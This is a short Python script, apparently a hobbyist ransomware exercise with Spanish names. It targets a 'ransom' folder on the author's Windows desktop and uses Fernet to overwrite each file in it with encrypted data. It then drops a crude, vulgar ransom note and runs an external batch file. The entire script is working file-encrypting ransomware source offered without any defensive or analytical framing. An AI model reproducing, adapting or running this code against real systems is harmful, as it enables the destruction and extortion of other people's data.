from cryptography.fernet import Fernet
import os
import subprocess
archivo = "C:\\Users\\taocl\\OneDrive\\Escritorio\\ransom\\Files"
encriptadojaja = "C:\\Users\\taocl\\OneDrive\\Escritorio\\ransom\\encriptadojaja"

os.rename(archivo, encriptadojaja)

def generar_key():
    key = Fernet.generate_key()
    with open('key.key', 'wb') as key_file:
        key_file.write(key)

def cargar_key():
    return open('key.key', 'rb').read()

def encrypt(items, key):
    f = Fernet(key)
    for item in items:
        with open(item, 'rb') as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(item, 'wb') as file:
            file.write(encrypted_data)

if __name__ == '__main__':

    path_to_encrypt = 'C:\\Users\\taocl\\OneDrive\\Escritorio\\ransom\\encriptadojaja'
    items = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt+'\\'+item for item in items]

    generar_key()
    key = cargar_key()

    encrypt(full_path, key)

    with open(path_to_encrypt+'\\'+'readme.txt', 'w') as file:
        file.write('Ficheros encriptados por el TAo\n')
        file.write('PENE PENE PENE PENE PENE PENJ EP NE PEN EP NE PEN')

subprocess.call([r'C:\Users\taocl\OneDrive\Escritorio\ransom\batcosas1.bat'])